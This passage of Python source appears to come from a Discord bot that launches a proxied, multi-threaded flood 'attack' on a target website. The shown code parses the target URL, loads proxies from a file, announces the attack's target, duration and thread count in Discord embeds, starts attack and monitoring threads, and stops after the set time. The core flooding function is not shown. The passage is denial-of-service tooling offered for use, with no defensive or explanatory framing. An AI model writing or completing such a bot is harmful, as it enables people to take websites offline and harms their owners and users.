    # Parse URL
    try:
        ParseUrl(website)
    except ValueError:
        await ctx.send("Error: Invalid URL.")
        return

    # Load proxies
    if not load_proxies():
        await ctx.send("Error: No proxies found in proxies.txt.")
        return

    # Initialize attack
    attack_active = True
    channel = ctx.channel
    start_time = time.time()
    ind_dict = {proxy: 0 for proxy in proxies}
    ind_rlock = threading.RLock()

    # Send start embed
    embed = discord.Embed(
        title="Attack Started",
        description=(
            f"**Target**: {target}\n"
            f"**Duration**: {duration}s\n"
            f"**Threads**: {thread_num}\n"
            f"**Proxies**: {len(proxies)}"
        ),
        color=discord.Color.green(),
        timestamp=datetime.datetime.utcnow()
    )
    await ctx.send(embed=embed)

    # Start attack and monitoring
    build_threads(thread_num, ind_rlock)
    asyncio.create_task(monitor_site())
    asyncio.create_task(update_status())

    # Wait for duration
    await asyncio.sleep(duration)
    attack_active = False
    embed = discord.Embed(
        title="Attack Stopped",
        description=f"**Target**: {target}\n**Status**: Attack completed",
        color=discord.Color.orange(),
        timestamp=datetime.datetime.utcnow()
    )
    await ctx.send(embed=embed)

# Run bot
if __name__ == "__main__":
    bot_token = ""  # Replace with your Discord bot token
    try:
        bot.run(bot_token)
    except Exception as e:
        logging.error(f"Failed to start bot: {e}")
        print(f"Error: Failed to start bot. Check your token and internet connection.")
